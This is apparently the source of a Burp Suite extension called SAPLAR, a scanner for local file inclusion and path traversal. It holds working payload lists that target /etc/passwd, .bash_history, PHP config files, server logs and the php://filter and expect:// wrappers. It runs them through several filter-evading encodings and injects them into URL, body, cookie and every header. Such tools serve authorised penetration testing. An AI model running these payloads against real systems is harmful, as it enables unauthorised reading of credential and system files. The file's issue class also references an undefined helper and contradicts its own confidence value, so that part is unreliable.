# -*- coding: utf-8 -*-
import sys
import base64
import zlib
import re
import hashlib

# Java imports
from java.lang import Object, Comparable
from java.util import ArrayList, Comparator
from javax.swing import (
    JMenuItem, JPanel, JScrollPane, JTable, JSplitPane,
    JTextArea, JTabbedPane, SwingUtilities, JCheckBox, BoxLayout, JLabel
)
from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer, TableRowSorter
from java.awt import BorderLayout, Color
from java.io import PrintWriter
from java.lang import Thread
from java.util.concurrent import Executors

try:
    reload(sys)
    sys.setdefaultencoding('utf-8')
except:
    pass

from burp import (
    IBurpExtender,
    IScannerCheck,
    IScanIssue,
    IContextMenuFactory,
    IHttpListener,
    ITab,
    IParameter
)

# Python 2 / Python 3 URL-encoding
try:
    from urllib import quote  # Py2
except ImportError:
    from urllib.parse import quote  # Py3


############################################################################
# ENCODING_METHODS – LFI payloads are tested with these encodings
############################################################################
def double_url_encode(payload):
    once = quote(payload)
    return quote(once)

def triple_url_encode(payload):
    first = quote(payload)
    second = quote(first)
    return quote(second)

def unicode_escape(payload):
    return ''.join('\\u{:04x}'.format(ord(c)) for c in payload)

ENCODING_METHODS = [
    lambda x: x,                                 # plain
    lambda x: base64.b64encode(x.encode()).decode(),  # Base64
    lambda x: quote(x),                          # URL-encode
    lambda x: ''.join(['%%%02X' % ord(c) for c in x]),# %HEX
    double_url_encode,
    triple_url_encode,
    unicode_escape,
]


############################################################################
# Helper Functions
############################################################################

def decompress_response(response_bytes):
    """Handle gzip/deflate if present."""
    try:
        return zlib.decompress(response_bytes, 16 + zlib.MAX_WBITS).decode("utf-8", "replace")
    except:
        return response_bytes

def deduplicateKey(urlObj, param_name, param_type):
    """
    Combine host + path + param_name + param_type to avoid re-scanning the same param.
    """
    host = urlObj.getHost()
    path = urlObj.getPath() or ""
    base_str = u"%s%s|%s|%s" % (host, path, param_name, str(param_type))
    return hashlib.md5(base_str.encode('utf-8')).hexdigest()


############################################################################
# LFI Payload Lists
############################################################################

BASE_LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%2500",
    "../../../../../../etc/passwd%00%00",
    "/proc/self/environ",
    "....//....//etc/passwd",
    # Windows
    "../../../../../../windows/win.ini",
    "../../../../../../windows/win.ini%00",
    "C:\\Windows\\win.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "expect://ls",
    "data://text/plain;base64,aGVsbG8=",
    "../../../../../../etc/passwd#",
]
CUSTOM_FILES = [
    "../../../../../../var/www/html/config.php",
    "../../../../../../var/www/html/database.php",
    "../../../../../../home/user/.bash_history",
    "../../../../../../var/log/apache2/access.log",
    "../../../../../../var/log/apache2/error.log",
    "../../../../../../etc/nginx/nginx.conf"
]

############################################################################
# Header / Cookie Handling
############################################################################
def parseHeaders(rawRequest):
    lines = rawRequest.split("\r\n")
    headers_dict = {}
    for line in lines[1:]:
        if not line.strip() or ":" not in line:
            break
        name, val = line.split(":", 1)
        headers_dict[name.strip()] = val.strip()
    return headers_dict

def buildRawRequestWithHeaders(rawRequest, newHeadersDict):
    lines = rawRequest.split("\r\n")
    request_line = lines[0]
    idx = 0
    for i, line in enumerate(lines[1:], start=1):
        if not line.strip():
            idx = i
            break
    old_body = ""
    if idx > 0 and idx < len(lines) - 1:
        old_body = "\r\n".join(lines[idx+1:])

    new_header_lines = []
    for k, v in newHeadersDict.items():
        new_header_lines.append("{}: {}".format(k, v))

    newRaw = request_line + "\r\n" + "\r\n".join(new_header_lines) + "\r\n\r\n" + old_body
    return newRaw


############################################################################
# Signatures & Error Patterns
############################################################################
LFI_SIGNATURES = [
    "root:x:0:0",
    "bin:x:1:1",
    "daemon:x:2:2",
    "NT AUTHORITY\\SYSTEM",
    "Windows Registry Editor",
    "kernel.core_pattern",
    r"uid=.*\(root\)",
    "groups=.*",
]
LFI_ERROR_PATTERNS = [
    "no such file or directory",
    "failed to open stream",
    "open_basedir restriction",
    "warning: include",
    "warning: require",
    "system cannot find the path specified",
    "permission denied",
]
FALSE_POSITIVE_INDICATORS = [
    "403 forbidden",
    "404 not found",
    "not found",
    "forbidden",
]

def detectServerType(responseHeaders):
    serverType = "unknown"
    for h in responseHeaders:
        if h.lower().startswith("server: "):
            val = h.split(":", 1)[1].strip().lower()
            if "apache" in val:
                serverType = "apache"
            elif "nginx" in val:
                serverType = "nginx"
            break
    return serverType


############################################################################
# LFIResult
############################################################################
class LFIResult(object):
    def __init__(self, url, param, payload, status, request, response):
        self.url = url
        self.param = param
        self.payload = payload
        self.status = status
        self.request = request
        self.response = response



class LfiCellRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        component = super(LfiCellRenderer, self).getTableCellRendererComponent(
            table, value, isSelected, hasFocus, row, column
        )
        status_value = table.getModel().getValueAt(row, 3)  # "Status" col index = 3

        if status_value is None:
            status_value = ""

        if isSelected:
            component.setBackground(table.getSelectionBackground())
            component.setForeground(table.getSelectionForeground())
        else:
            lower_status = status_value.lower()
            # Exactly what user wants:
            # Exploited => Red, SuspectedError => Yellow, NotExploited => White
            if "exploited" in lower_status:
                component.setBackground(Color(255, 150, 150))  # Light Red
            elif "suspectederror" in lower_status:
                component.setBackground(Color(255, 255, 150))  # Yellow
            elif "notexploited" in lower_status:
                component.setBackground(Color.white)           # White
            else:
                component.setBackground(Color.white)           # default white

            component.setForeground(Color.black)

        return component


############################################################################
# "Exploited" at top - comparator
############################################################################
class StatusComparator(Comparator):
    def compare(self, o1, o2):
        if o1 is None:
            o1 = ""
        if o2 is None:
            o2 = ""

        s1 = o1.lower()
        s2 = o2.lower()

        isExp1 = "exploited" in s1
        isExp2 = "exploited" in s2

        if isExp1 and not isExp2:
            return -1
        elif isExp2 and not isExp1:
            return 1
        else:
            return cmp(s1, s2)

def cmp(a, b):
    if a < b:
        return -1
    elif a > b:
        return 1
    else:
        return 0


############################################################################
# Main Extension
############################################################################
class BurpExtender(IBurpExtender, IScannerCheck, IContextMenuFactory, IHttpListener, ITab):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)

        callbacks.setExtensionName("SAPLAR")

        callbacks.registerScannerCheck(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.registerHttpListener(self)

        self.executor = Executors.newFixedThreadPool(10)

        self.scannedRequests = set()
        self.vulnerableParams = set()

        # GUI
        self._mainPanel = JPanel(BorderLayout())
        self.optionsPanel = JPanel()
        self.optionsPanel.setLayout(BoxLayout(self.optionsPanel, BoxLayout.Y_AXIS))

        self.labelOptions = JLabel("Scan Options:")
        self.checkUrlParams = JCheckBox("Scan URL Params", True)
        self.checkBodyParams = JCheckBox("Scan Body Params", True)
        self.checkCookieParams = JCheckBox("Scan Cookie Params", True)

        try:
            _ = IParameter.PARAM_HEADER
            self.checkHeaderParams = JCheckBox("Scan Header Params", True)
        except:
            self.checkHeaderParams = JCheckBox("Scan Header Params [Not Supported]", False)
            self.checkHeaderParams.setEnabled(False)

        self.checkProxyActive = JCheckBox("Auto-Scan Proxy Requests (Active)", False)
        self.checkProxyPassive = JCheckBox("Auto-Scan Proxy Responses (Passive)", False)

        self.checkAllHeaders = JCheckBox("Inject Payload into ALL Headers", False)
        self.checkAllCookies = JCheckBox("Inject Payload into ALL Cookies", False)

        self.optionsPanel.add(self.labelOptions)
        self.optionsPanel.add(self.checkUrlParams)
        self.optionsPanel.add(self.checkBodyParams)
        self.optionsPanel.add(self.checkCookieParams)
        self.optionsPanel.add(self.checkHeaderParams)
        self.optionsPanel.add(JLabel("Proxy Traffic:"))
        self.optionsPanel.add(self.checkProxyActive)
        self.optionsPanel.add(self.checkProxyPassive)
        self.optionsPanel.add(JLabel("Advanced Header/Cookie Injection:"))
        self.optionsPanel.add(self.checkAllHeaders)
        self.optionsPanel.add(self.checkAllCookies)

        self._tableModel = DefaultTableModel(["URL", "Parameter", "Payload", "Status"], 0)
        self._table = JTable(self._tableModel)
        self._table.setFillsViewportHeight(True)

        # Attach color-coded renderer
        self._table.setDefaultRenderer(Object, LfiCellRenderer())

        # "Status" sorting => "Exploited" top
        self.rowSorter = TableRowSorter(self._tableModel)
        self.rowSorter.setComparator(3, StatusComparator())
        self._table.setRowSorter(self.rowSorter)

        self._detailTabs = JTabbedPane()
        self._requestTextArea = JTextArea()
        self._responseTextArea = JTextArea()
        self._detailTabs.addTab("Request", JScrollPane(self._requestTextArea))
        self._detailTabs.addTab("Response", JScrollPane(self._responseTextArea))

        splitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT,
                               JScrollPane(self._table),
                               self._detailTabs)
        splitPane.setDividerLocation(200)

        self._mainPanel.add(self.optionsPanel, BorderLayout.PAGE_START)
        self._mainPanel.add(splitPane, BorderLayout.CENTER)

        def onRowSelection(e):
            if e.getValueIsAdjusting():
                return
            row = self._table.getSelectedRow()
            if row >= 0:
                modelRow = self._table.convertRowIndexToModel(row)
                res = self._results[modelRow]
                self._requestTextArea.setText(res.request)
                self._responseTextArea.setText(res.response)

        self._table.getSelectionModel().addListSelectionListener(onRowSelection)
        self._results = []

        callbacks.addSuiteTab(self)
        self._stdout.println("[+] SAPLAR (LFI & Path Traversal Scanner) loaded.")


    #
    # ITab
    #
    def getTabCaption(self):
        return "LFI Scan"

    def getUiComponent(self):
        return self._mainPanel

    #
    # addScanResult
    #
    def addScanResult(self, lfiResult):
        self._results.append(lfiResult)
        rowData = [lfiResult.url, lfiResult.param, lfiResult.payload, lfiResult.status]
        def addRow():
            self._tableModel.addRow(rowData)
        SwingUtilities.invokeLater(addRow)


    #
    # IContextMenuFactory
    #
    def createMenuItems(self, invocation):
        menu = ArrayList()
        menu.add(JMenuItem("🔍 Scan for LFI", actionPerformed=lambda _: self.startLfiScan(invocation)))
        return menu


    #
    # IHttpListener
    #
    def processHttpMessage(self, toolFlag, isRequest, messageInfo):
        if isRequest:
            if self.checkProxyActive.isSelected():
                self.executor.submit(lambda: self.doActiveScan(messageInfo, None))
        else:
            if self.checkProxyPassive.isSelected():
                self.executor.submit(lambda: self.doPassiveScan(messageInfo))


    #
    # startLfiScan
    #
    def startLfiScan(self, invocation):
        msgs = invocation.getSelectedMessages()
        if not msgs:
            return
        self._stdout.println("[+] Manual LFI scan triggered.")
        for m in msgs:
            self.executor.submit(lambda: self.doActiveScan(m, None))


    #
    # doActiveScan
    #
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        try:
            request_info = self._helpers.analyzeRequest(baseRequestResponse)
            urlObj = request_info.getUrl()
            url_str = str(urlObj)

            base_resp = baseRequestResponse.getResponse()
            if base_resp:
                original_length = len(self._helpers.bytesToString(base_resp))
            else:
                original_length = 0

            parameters = request_info.getParameters()

            param_types_to_scan = []
            if self.checkUrlParams.isSelected():
                param_types_to_scan.append(IParameter.PARAM_URL)
            if self.checkBodyParams.isSelected():
                param_types_to_scan.append(IParameter.PARAM_BODY)
            if self.checkCookieParams.isSelected():
                param_types_to_scan.append(IParameter.PARAM_COOKIE)
            try:
                if IParameter.PARAM_HEADER and self.checkHeaderParams.isSelected():
                    param_types_to_scan.append(IParameter.PARAM_HEADER)
            except:
                pass

            base_resp2 = baseRequestResponse.getResponse()
            res_info = None
            if base_resp2:
                res_info = self._helpers.analyzeResponse(base_resp2)
            if res_info:
                server_type = detectServerType(res_info.getHeaders())
            else:
                server_type = "unknown"

            final_lfi_payloads = list(BASE_LFI_PAYLOADS)
            final_lfi_payloads += CUSTOM_FILES

            if self.checkAllHeaders.isSelected() or self.checkAllCookies.isSelected():
                self.injectAllHeadersAndCookies(baseRequestResponse, final_lfi_payloads)

            for param in parameters:
                if param.getType() not in param_types_to_scan:
                    continue

                param_name = param.getName()
                param_type = param.getType()

                dedup_key = deduplicateKey(urlObj, param_name, param_type)
                if dedup_key in self.scannedRequests:
                    continue
                self.scannedRequests.add(dedup_key)

                if dedup_key in self.vulnerableParams:
                    continue

                for payload in final_lfi_payloads:
                    found_exploit = False
                    for encode_func in ENCODING_METHODS:
                        encoded_payload = encode_func(payload)

                        new_request = self._helpers.updateParameter(
                            baseRequestResponse.getRequest(),
                            self._helpers.buildParameter(param_name, encoded_payload, param_type)
                        )
                        attackResp = self._callbacks.makeHttpRequest(
                            baseRequestResponse.getHttpService(),
                            new_request
                        )
                        if not attackResp:
                            self._stdout.println("[!] makeHttpRequest => None, skip.")
                            continue

                        raw_attack_response = attackResp.getResponse()
                        if not raw_attack_response:
                            continue

                        res_info2 = self._helpers.analyzeResponse(raw_attack_response)
                        if not res_info2:
                            continue
                        headers2 = res_info2.getHeaders()
                        if not headers2:
                            continue

                        status_code = res_info2.getStatusCode()
                        if any("Content-Encoding: gzip" in h for h in headers2):
                            body_str = decompress_response(raw_attack_response)
                        else:
                            body_str = self._helpers.bytesToString(raw_attack_response)

                        new_len = len(body_str)
                        if abs(new_len - original_length) < 50:
                            self.recordNotExploited(url_str, param_name, encoded_payload, "SameLen", new_request, headers2, body_str)
                            continue

                        lfi_found = self.advancedLfiDetection(body_str)
                        if lfi_found["exploit"]:
                            if self.isFalsePositive(body_str, status_code):
                                self.recordNotExploited(url_str, param_name, encoded_payload, "FP", new_request, headers2, body_str)
                            else:
                                self.recordExploit(url_str, param_name, payload, new_request, headers2, body_str, status_code)
                                self.vulnerableParams.add(dedup_key)
                                found_exploit = True
                                break
                        elif lfi_found["error"]:
                            self.recordSuspectedError(url_str, param_name, encoded_payload, new_request, headers2, body_str, status_code)
                        else:
                            self.recordNotExploited(url_str, param_name, encoded_payload, "", new_request, headers2, body_str)

                        if found_exploit:
                            break
                    if found_exploit:
                        break

        except Exception as e:
            self._stderr.println("[ERROR] doActiveScan: %s" % str(e))


    #
    # doPassiveScan
    #
    def doPassiveScan(self, baseRequestResponse):
        try:
            if not baseRequestResponse:
                return None

            raw_resp = baseRequestResponse.getResponse()
            if not raw_resp:
                return None

            res_info = self._helpers.analyzeResponse(raw_resp)
            if not res_info:
                return None

            headers = res_info.getHeaders()
            if not headers:
                return None

            status_code = res_info.getStatusCode()
            if any("Content-Encoding: gzip" in h for h in headers):
                body_str = decompress_response(raw_resp)
            else:
                body_str = self._helpers.bytesToString(raw_resp)

            lfi_found = self.advancedLfiDetection(body_str)
            if lfi_found["exploit"] or lfi_found["error"]:
                url_str = str(self._helpers.analyzeRequest(baseRequestResponse).getUrl())
                snippet = body_str[:500]
                self._stdout.println("[!] Passive LFI Indication -> %s" % url_str)
                pass_lfiResult = LFIResult(
                    url_str,
                    "N/A (Passive Scan)",
                    "N/A",
                    "Possible LFI (Passive)",
                    "",
                    "[Status: %d]\n%s\n\n%s" % (status_code, "\n".join(headers), snippet)
                )
                self.addScanResult(pass_lfiResult)
        except Exception as e:
            self._stderr.println("[ERROR] doPassiveScan: %s" % str(e))
        return None


    #
    # LFI Detection Helpers
    #
    def advancedLfiDetection(self, body_str):
        result = {"exploit": False, "error": False}
        # search for known LFI signatures
        for sig in LFI_SIGNATURES:
            if re.search(sig, body_str, re.IGNORECASE):
                result["exploit"] = True
                break
            b64sig = base64.b64encode(sig.encode()).decode()
            if b64sig in body_str:
                result["exploit"] = True
                break

        if not result["exploit"]:
            # look for typical LFI error patterns
            for err in LFI_ERROR_PATTERNS:
                if re.search(err, body_str, re.IGNORECASE):
                    result["error"] = True
                    break
        return result

    def isFalsePositive(self, body_str, status_code):
        if status_code in [403, 404]:
            return True
        for fp_word in FALSE_POSITIVE_INDICATORS:
            if fp_word in body_str.lower():
                return True
        return False


    #
    # Save "NotExploited"/"Exploited"/"SuspectedError"
    #
    def recordNotExploited(self, url_str, param, payload, reason, requestBytes, headers, body_str):
        if reason:
            status = "NotExploited({})".format(reason)
        else:
            status = "NotExploited"
        request_str = self._helpers.bytesToString(requestBytes)
        preview = body_str[:300]
        resp_str = "[Headers]\n{}\n\n[Body(300 chars)]\n{}".format("\n".join(headers), preview)
        self.addScanResult(LFIResult(url_str, param, payload, status, request_str, resp_str))

    def recordExploit(self, url_str, param, payload, requestBytes, headers, body_str, status_code):
        request_str = self._helpers.bytesToString(requestBytes)
        resp_headers = "\n".join(headers)
        response_full = "[Status: {}]\n{}\n\n{}".format(status_code, resp_headers, body_str)
        self.addScanResult(LFIResult(url_str, param, payload, "Exploited", request_str, response_full))

        # optional base64 decode
        if re.search(r'^[A-Za-z0-9+/=]+$', body_str) and len(body_str) > 50:
            try:
                decoded_content = base64.b64decode(body_str).decode('utf-8', 'ignore')
                self._stdout.println("[+] Base64 Decoded Content:\n" + decoded_content)
            except Exception as ee:
                self._stdout.println("[ERROR] base64 decode hatasi: " + str(ee))

    def recordSuspectedError(self, url_str, param, payload, requestBytes, headers, body_str, status_code):
        status = "SuspectedError"
        request_str = self._helpers.bytesToString(requestBytes)
        resp_headers = "\n".join(headers)
        response_full = "[Status: {}]\n{}\n\n{}".format(status_code, resp_headers, body_str[:500])
        self.addScanResult(LFIResult(url_str, param, payload, status, request_str, response_full))


    #
    # injectAllHeadersAndCookies
    #
    def injectAllHeadersAndCookies(self, baseRequestResponse, payload_list):
        try:
            raw_req_bytes = baseRequestResponse.getRequest()
            if not raw_req_bytes:
                return
            raw_req_str = self._helpers.bytesToString(raw_req_bytes)

            original_headers = parseHeaders(raw_req_str)
            cookies_str = original_headers.get("Cookie", None)

            if cookies_str and self.checkAllCookies.isSelected():
                cookies = {}
                parts = cookies_str.split(";")
                for part in parts:
                    part = part.strip()
                    if "=" in part:
                        cName, cVal = part.split("=", 1)
                        cookies[cName.strip()] = cVal.strip()

                for cName in cookies.keys():
                    for p in payload_list:
                        for encf in ENCODING_METHODS:
                            enc_payload = encf(p)
                            new_cookies = dict(cookies)
                            new_cookies[cName] = enc_payload
                            newCookieVal = "; ".join(["{}={}".format(k, v) for k, v in new_cookies.items()])
                            mod_headers = dict(original_headers)
                            mod_headers["Cookie"] = newCookieVal
                            newRaw = buildRawRequestWithHeaders(raw_req_str, mod_headers)
                            newRequestBytes = self._helpers.stringToBytes(newRaw)

                            attackResp = self._callbacks.makeHttpRequest(
                                baseRequestResponse.getHttpService(),
                                newRequestBytes
                            )
                            if not attackResp:
                                self._stdout.println("[!] makeHttpRequest => None (Cookie inject).")
                                continue

                            self.analyzeManualHeaderAttack(p, cName, newRequestBytes, attackResp)

            if self.checkAllHeaders.isSelected():
                for hKey in original_headers.keys():
                    if hKey.lower() in ["host", "cookie", "content-length"]:
                        continue
                    for p in payload_list:
                        for encf in ENCODING_METHODS:
                            enc_payload = encf(p)
                            mod_headers = dict(original_headers)
                            mod_headers[hKey] = enc_payload
                            newRaw = buildRawRequestWithHeaders(raw_req_str, mod_headers)
                            newRequestBytes = self._helpers.stringToBytes(newRaw)

                            attackResp = self._callbacks.makeHttpRequest(
                                baseRequestResponse.getHttpService(),
                                newRequestBytes
                            )
                            if not attackResp:
                                self._stdout.println("[!] makeHttpRequest => None (Header inject).")
                                continue

                            self.analyzeManualHeaderAttack(p, hKey, newRequestBytes, attackResp)

        except Exception as exc:
            self._stderr.println("[ERROR] injectAllHeadersAndCookies: %s" % str(exc))

    def analyzeManualHeaderAttack(self, payload, headerName, requestBytes, attackResp):
        if not attackResp:
            self._stdout.println("[!] analyzeManualHeaderAttack - attackResp=None, skip.")
            return

        raw_attack_response = attackResp.getResponse()
        if not raw_attack_response:
            self._stdout.println("[!] No response data, skip.")
            return

        res_info = self._helpers.analyzeResponse(raw_attack_response)
        if not res_info:
            return

        headers2 = res_info.getHeaders()
        if not headers2:
            return

        status_code = res_info.getStatusCode()
        if any("Content-Encoding: gzip" in h for h in headers2):
            body_str = decompress_response(raw_attack_response)
        else:
            body_str = self._helpers.bytesToString(raw_attack_response)

        lfi_found = self.advancedLfiDetection(body_str)
        if lfi_found["exploit"]:
            if self.isFalsePositive(body_str, status_code):
                self.recordNotExploited("HeaderAttack", headerName, payload, "FP", requestBytes, headers2, body_str)
            else:
                self.recordExploit("HeaderAttack", headerName, payload, requestBytes, headers2, body_str, status_code)
        elif lfi_found["error"]:
            self.recordSuspectedError("HeaderAttack", headerName, payload, requestBytes, headers2, body_str, status_code)
        else:
            self.recordNotExploited("HeaderAttack", headerName, payload, "", requestBytes, headers2, body_str)



############################################################################
# Custom IScanIssue
############################################################################
class LFISAPLAR(IScanIssue):
    def __init__(self, baseRequestResponse, attackRequest, attackResponse, payload):
        self._httpService = baseRequestResponse.getHttpService()
        self._requestResponse = baseRequestResponse
        self._attackRequestResponse = attackResponse
        self._issueDetail = "Possible LFI detected with payload: " + payload
        self._issueName = "LFI Vulnerability"
        self._severity = "High"
        self._confidence = "Certain"

    def getUrl(self):
        return self._helpers.analyzeRequest(self._requestResponse).getUrl()

    def getIssueName(self):
        return self._issueName

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Tentative"

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._issueDetail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return [self._requestResponse, self._attackRequestResponse]

    def getHttpService(self):
        return self._httpService
